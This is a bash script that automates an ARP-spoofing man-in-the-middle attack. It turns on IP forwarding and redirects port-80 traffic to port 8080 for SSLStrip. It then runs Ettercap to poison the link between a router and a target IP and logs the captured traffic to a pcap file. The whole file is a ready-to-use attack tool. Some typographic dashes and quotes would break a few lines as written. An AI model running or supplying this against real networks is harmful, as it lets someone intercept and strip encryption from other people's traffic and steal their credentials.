#! /bin/bash
# start Ettercap text
 
echo first configuring IP tables…
echo 1 > /proc/sys/net/ipv4/ip_forward
echo Enter interface for IP tables i.e. eth0, wlan0 etc
read -p ‘Interface name: ‘ intvar
iptables -A PREROUTING -t nat -i $intvar -p tcp —-dport 80 -j REDIRECT —-to-port 8080
read -r -p "Are you ready to start Ettercap and SSLStrip started? [y/N] " response
if [[ $response =~ ^([yY][eE][sS]|[yY])$ ]]
then
	echo Which interface to use i.e. eth0, wlan0 etc
	read -p 'Interface: ' intervar
	echo Enter filename
	read -p 'Filename: ' filevar
	echo Enter Router IP
	read -p 'Router IP: ' routervar
	echo Enter Target IP - if required
	read -p 'Target IP: ' targetvar
	ettercap -T -i $intervar -M ARP -d -w /root/etterlog/$filevar.pcap /$routervar//$targetvar/
else
    echo ettercap cancelled
echo finished
fi
